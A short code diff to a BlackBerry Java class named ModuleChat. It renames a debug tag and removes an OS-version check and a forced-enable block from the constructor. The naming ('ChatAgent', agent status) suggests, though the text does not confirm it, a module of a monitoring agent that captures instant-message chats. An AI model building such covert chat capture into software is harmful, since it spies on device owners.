@@ -35,7 +35,7 @@ import blackberry.utils.WChar;
 public final class ModuleChat extends BaseModule implements BacklightObserver,
         ApplicationObserver {
     //#ifdef DEBUG
-    static Debug debug = new Debug("ModuleChat", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("ModChat", DebugLevel.VERBOSE);
     //#endif
 
     private static final long APP_TIMER_PERIOD = 5000;
@@ -62,18 +62,6 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
      *            the agent status
      */
     public ModuleChat() {
-
-        if (!Device.getInstance().atLeast(5, 0)) {
-            //#ifdef DEBUG
-            debug.error("ChatAgent: not supported before OS 5.0");
-            //#endif
-            enable(false);
-            return;
-        }
-
-        //#ifdef IM_FORCED
-        enable(true);
-        //#endif
 
     }
 
